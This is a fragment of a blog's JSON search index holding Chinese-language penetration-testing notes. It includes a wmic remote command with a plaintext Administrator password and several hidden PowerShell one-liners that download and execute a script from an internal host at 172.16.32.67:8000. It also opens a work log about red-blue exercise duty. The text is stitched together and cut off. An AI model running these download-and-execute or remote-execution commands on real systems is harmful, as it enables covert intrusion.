排查探针全流设备查看是否需要由优化\nwmic /node:172.16.32.130 /user:Adiministrator /password:QIULIYANG process call create \u0026ldquo;cmd.exe /c ipconfig\u0026gt;d:\\result.txt\u0026rdquo;\n","permalink":"http://guozhi1.github.io/posts/pwn/buuctfbjdctf_2020_babystack%E8%A7%A3%E9%A2%98/","summary":"echo curl -o 1.ps1 http://172.16.32.67:8000/1.ps1 \u0026gt; 1.bat 运行powershell 脚本 powershell -WindowStyle hidden -exec bypass -file 1.ps1 set scriptblock \u0026lsquo;powershell -WindowStyle Hidden -Command \u0026ldquo;IEX (New-Object Net.WebClient).DownloadString(\u0026lsquo;http://172.16.32.67:8000/1.ps1\u0026rsquo;)\u0026rdquo;\u0026rsquo; set scriptblock \u0026lsquo;powershell -WindowStyle Hidden -Command \u0026ldquo;wget \u0026ldquo;\u0026rsquo; 下载并执行 IEX (New-Object Net.WebClient).DownloadString(\u0026lsquo;http://172.16.32.67:8000/1.ps1\u0026rsquo;) 无窗口执行 powershell -WindowStyle Hidden -Command \u0026ldquo;IEX (New-Object Net.WebClient).DownloadString(\u0026lsquo;http://172.16.32.67:8000/1.ps1\u0026rsquo;)\u0026rdquo; powershell -WindowStyle Hidden -Command \u0026ldquo;IEX (New-Object Net.WebClient).DownloadString(\u0026lsquo;http://172.16.32.67:8000/1.ps1\u0026rsquo;)\u0026rdquo; 一、总体工作内容 参与中国移动安全运营建设，完成中国移动网络安全保障，进行中国移动攻防演练值守，对甲方内外网业务系统建设安全屏障。 二、今日","title":""}]